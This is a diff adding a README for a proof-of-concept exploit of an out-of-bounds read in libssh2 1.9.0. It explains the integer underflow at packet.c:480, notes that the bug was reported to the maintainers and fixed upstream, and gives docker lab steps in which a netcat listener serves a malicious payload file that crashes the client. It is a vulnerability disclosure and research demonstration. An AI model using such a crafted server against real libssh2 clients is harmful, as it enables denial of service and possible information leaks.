@@ -1,0 +1,77 @@
+# Out-of-bounds read in libssh2
+
+[libssh2](https://www.libssh2.org/) version 1.9.0 contains a remotely triggerable out-of-bounds read, leading to denial of service or potentially to information disclosure. I reported this bug to libssh2-security@haxx.se on 2019-07-01. At the time of writing (2019-10-11), it has been [fixed on the master branch](https://github.com/libssh2/libssh2/pull/402/commits/1c6fa92b77e34d089493fe6d3e2c6c8775858b94), but a new official version containing a fix has not yet been released.
+
+This directory contains a proof of concept exploit for the vulnerability. It uses [docker](https://www.docker.com/) to simulate two computers. The first is a server, with a simple [netcat](https://linux.die.net/man/1/nc) command listening on port 22. The second is a client, running `libssh2`. When the client attempts to connect to server, the server sends back a malicious response which triggers a segmentation fault in the client.
+
+The source location of the vulnerability is [packet.c:480](https://github.com/libssh2/libssh2/blob/42d37aa63129a1b2644bf6495198923534322d64/src/packet.c#L480):
+
+```
+if(message_len < datalen-13) {
+```
+
+The value of `datalen` is untrusted because it came from the remote computer. If `datalen == 11`, for example, then the subtraction will overflow and the bounds-check of `message_len` is ineffective, leading to an out-of-bounds read on [line 485](https://github.com/libssh2/libssh2/blob/42d37aa63129a1b2644bf6495198923534322d64/src/packet.c#L485).
+
+## Network setup
+
+Create a docker network bridge, to simulate a network with two separate computers.
+
+```
+docker network create -d bridge --subnet 172.18.0.0/16 libssh2-demo-network
+```
+
+## Server setup
+
+Build the docker image:
+
+```
+docker build server -t libssh2-server --build-arg UID=`id -u`
+```
+
+Start the container:
+
+```
+docker run --rm --network libssh2-demo-network --ip=172.18.0.10 -i -t libssh2-server
+```
+
+Start the malicious "ssh server":
+
+```
+sudo nc -l -p 22 < poc.bin  # password is x
+```
+
+## Client setup
+
+Build the docker image:
+
+```
+docker build client -t libssh2-client --build-arg UID=`id -u`
+```
+
+Start the container:
+
+```
+docker run --rm --network libssh2-demo-network --ip=172.18.0.11 -i -t libssh2-client
+```
+
+If you want to be able to debug libssh2 with gdb, then you need to start the container with a few extra arguments:
+
+```
+docker run --rm --network libssh2-demo-network --ip=172.18.0.11 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -i -t libssh2-client
+```
+
+In the container, attempt to connect to the server:
+
+```
+cd ~/libssh2/example
+./ssh2 172.18.0.10
+```
+
+This command crashes with a segmentation fault.
+
+If you would like to debug libssh2 with [gdb](https://www.gnu.org/software/gdb/), then start it like this:
+
+```
+cd ~/libssh2/example/.libs
+LD_LIBRARY_PATH="/home/victim/libssh2/src/.libs:$LD_LIBRARY_PATH" gdb --args ./ssh2 172.18.0.10
+```
